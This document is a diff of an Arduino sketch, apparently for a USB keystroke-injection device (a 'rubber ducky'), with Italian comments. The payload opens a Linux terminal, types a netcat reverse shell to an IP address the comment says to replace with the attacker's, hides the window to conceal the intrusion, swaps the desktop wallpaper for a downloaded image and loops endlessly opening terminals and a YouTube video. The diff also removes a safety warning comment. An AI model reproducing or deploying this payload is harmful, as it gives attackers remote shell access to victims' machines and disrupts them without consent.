@@ -1,12 +1,12 @@
 #include <Adafruit_NeoPixel.h>
 #include <Keyboard.h>
-#include <Mouse.h>
 
 #ifdef __AVR__
  #include <avr/power.h> // Required for 16 MHz Adafruit Trinket
 #endif
 
-#define BUTTON_PIN   24
+
+#define PIXEL_PIN    23  // Digital IO pin connected to the NeoPixels.
 
 #define PIXEL_COUNT 1 // Number of NeoPixels
 
@@ -28,25 +28,24 @@ void setup() {
   strip.begin(); // Initialize NeoPixel strip object (REQUIRED)
   strip.setPixelColor(0,red);
   strip.show();  //rosso di stand-by
-  //15 second attesa, estremamente importante durante la fase di development per evitare spiacevoli incidenti.
-  //suggerisco di non lanciare mai una rubber ducky sullo stesso sistema operativo che si vuole attaccare.
+  //15 second attesa
   delay(15000);
-  strip.setPixelColor(0,blue); //l'attacco sta cominciando
+  strip.setPixelColor(0,blue); //l'attacco sta cominciando, il led diventa blu
   strip.show();
   
 //prima shell
-  delay(50);
+  delay(100);
   Keyboard.press(KEY_LEFT_CTRL);
-  delay(50);
+  delay(100);
   Keyboard.press(KEY_LEFT_ALT);
-  delay(250);
+  delay(450);
   Keyboard.write('t');
-  delay(30);
+  delay(50);
   Keyboard.releaseAll();
   
   //reverse shell attaccante
-  delay(620);
-  Keyboard.print("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 5555 >/tmp/f"); ////MODIFICARE QUESTO INDIRIZZO IP
+  delay(820);
+  Keyboard.print("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 5555 >/tmp/f"); ////MODIFICARE QUESTO INDIRIZZO IP CON QUELLO DELL'ATTACCANTE
   //per capire cosa fa questo comando suggerisco la visione del seguente video
   //https://youtu.be/_q_ZCy-hEqg
   delay(30);
@@ -54,7 +53,7 @@ void setup() {
   delay(50);
   Keyboard.press(KEY_LEFT_GUI);
   delay(50);
-  Keyboard.write('h'); //minimizziamo la finestra su cui sta girando netcat
+  Keyboard.write('h');//minimizziamo la finestra su cui sta girando netcat per occultare l'intrusione 
   delay(50);  
   Keyboard.releaseAll();
   delay(100);
@@ -69,7 +68,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(500);  
   Keyboard.print ("wget -O /tmp/fuck https://cdn.shopify.com/s/files/1/0604/4801/products/Pirate_1_b0a169e0-feba-450d-b81b-f3db5703c7d4.jpeg?v=1514697320");
-  delay(30); //scarichiamo l'immagine da sostituire allo sfondo
+  delay(30);                    //scarichiamo l'immagine da sostituire allo sfondo e aspettiamo 5 secondi per assicurarci che l'abbia scaricata
   Keyboard.write(KEY_RETURN);
   delay(5000);
       
@@ -77,7 +76,6 @@ void setup() {
 
 void loop() {
   //QUESTO E' IL LOOP INFINITO, USARE CON CAUTELA ##############################################################
-      //terza shell infinita
       Keyboard.press(KEY_LEFT_CTRL);
       delay(30);
       Keyboard.press(KEY_LEFT_ALT);
@@ -86,17 +84,16 @@ void loop() {
       delay(30);
       Keyboard.releaseAll();
       delay(500);
-      //il desktop viene alterato
       Keyboard.print("gsettings set org.gnome.desktop.background picture-uri file:////tmp/fuck");
-      delay(30);
+      delay(30);  //cambiamo lo sfondo
       Keyboard.write(KEY_RETURN);
       delay(100);
-      //video yt
-      Keyboard.print("firefox https://youtu.be/Ic2Cjw7kydI");
-      delay(50);
-      Keyboard.write(KEY_RETURN);
-      delay(8000);
-      Keyboard.write(' ');
-      delay(3000);
+  //video yt
+     Keyboard.print("firefox https://youtu.be/Ic2Cjw7kydI");
+     delay(50);
+     Keyboard.write(KEY_RETURN);
+     delay(8000);
+     Keyboard.write(' ');
+     delay(3000);
 
 }
